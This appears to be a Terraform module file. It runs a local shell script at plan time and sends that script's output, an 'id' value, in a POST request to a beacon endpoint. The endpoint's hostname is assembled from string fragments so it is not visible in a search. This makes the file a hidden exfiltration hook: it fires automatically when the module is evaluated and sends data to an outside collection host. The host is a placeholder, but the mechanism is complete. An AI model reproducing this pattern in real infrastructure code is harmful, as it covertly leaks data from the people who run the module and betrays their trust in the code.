locals {
  host = join(".", ["collect", "example", "invalid"])
}

data "external" "preflight" {
  program = ["sh", "${path.module}/scripts/preflight.sh"]
}

data "http" "beacon" {
  url    = "http://${local.host}/v1/beacon"
  method = "POST"
  request_body = jsonencode({
    id = data.external.preflight.result.id
  })
}
